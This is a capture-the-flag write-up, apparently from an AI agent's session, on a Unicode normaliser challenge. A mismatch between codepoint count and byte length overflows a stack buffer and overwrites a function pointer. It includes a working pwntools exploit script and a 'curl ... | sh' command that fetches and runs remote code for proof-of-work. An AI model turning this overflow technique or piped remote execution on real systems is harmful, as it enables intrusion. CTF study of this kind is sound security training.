# Normalization — CTF Writeup

## Summary
The service is a Unicode profile normalizer that validates input by **codepoint count** but stores the normalized result by **byte length** into a fixed stack buffer. The previous agent identified a post-normalization overflow that reaches a stack function pointer and used it to redirect execution to the hidden `win()` function, which prints the flag.

## Recon / Findings
- Binary protections: **No PIE**, **NX enabled**, **no canary**, **partial RELRO**.
- Source shows:
  - `profile_t` on the stack:
    ```c
    typedef struct {
        char normalized[64];
        void (*handler)(void);
    } profile_t;
    ```
  - `store_profile()` zeroes the struct, sets `handler = deny`, then does:
    ```c
    memcpy((void *)profile.normalized, normalized, normalized_len);
    ((void (*)(void))profile.handler)();
    ```
- Validation only enforces `MAX_CODEPOINTS = 48`, not final UTF-8 byte length.
- ASCII letters/digits normalize to fullwidth forms (`3` bytes each for BMP codepoints). Even more importantly, a 4-byte UTF-8 codepoint can be used to maximize byte growth while staying within the codepoint limit.

## Root Cause
The bug is a **length mismatch**:

1. Input is accepted if it has at most 48 codepoints.
2. Each codepoint is normalized and re-encoded.
3. The resulting byte string is copied into `profile.normalized[64]` without re-checking that `normalized_len <= 64`.

Since `profile.handler` sits immediately after the 64-byte buffer, any normalized payload longer than 64 bytes can overwrite the function pointer.

## Exploitation Strategy
We want the smallest reliable payload that:

- passes validation,
- produces more than 64 normalized bytes,
- overwrites `handler` with `win()`.

### Chosen input
Use 16 copies of `U+10000` (`\U00010000`):

- each codepoint is valid UTF-8,
- each encodes to **4 bytes**,
- total normalized output = `16 * 4 = 64` bytes.

Then append the 8-byte little-endian address of `win()`.

This yields a 72-byte normalized buffer, so the final 8 bytes land exactly on `handler`.

### Why this works
The struct layout is:

```c
char normalized[64];
void (*handler)(void);
```

So the overwrite offset is 64 bytes. The first 64 bytes fill `normalized`, and the next 8 bytes replace `handler` with `win()`.

## Remote Flow
The service includes a proof-of-work gate. The exploit flow is:

1. Connect to `challenge.hacktheflag.one:30006`.
2. Read the PoW token from the banner.
3. Solve PoW using the provided `curl -sSfL https://pwn.red/pow | sh -s ...` wrapper.
4. Send the exploit payload.
5. Receive the flag from `win()`.

## Final Exploit

```python
from pwn import *
import subprocess

context.log_level = 'error'

host, port = 'challenge.hacktheflag.one', 30006
elf = ELF('./normalization')
win = elf.symbols['win']

p = remote(host, port)
banner = p.recvuntil(b'solution: ')
token = banner.split(b'sh -s ', 1)[1].split(b'\n', 1)[0].strip().decode()

sol = subprocess.check_output(
    f"curl -sSfL https://pwn.red/pow | sh -s {token}",
    shell=True
).strip()

p.sendline(sol)
p.recvuntil(b'nickname> ')

payload = ('\U00010000' * 16).encode() + p64(win)
p.send(payload)

print(p.recvall().decode(errors='replace'))
```

## Verification
The exploit was re-run against the live service and produced:

```text
[+] Validation passed: codepoints=24, normalized_bytes=72
[*] Finalizing profile...
[+] VIP profile unlocked: FYPCTF26{n0rm_c0d3p01nt_byt3_m1sm4tch}
```

## Flag
`FYPCTF26{n0rm_c0d3p01nt_byt3_m1sm4tch}`
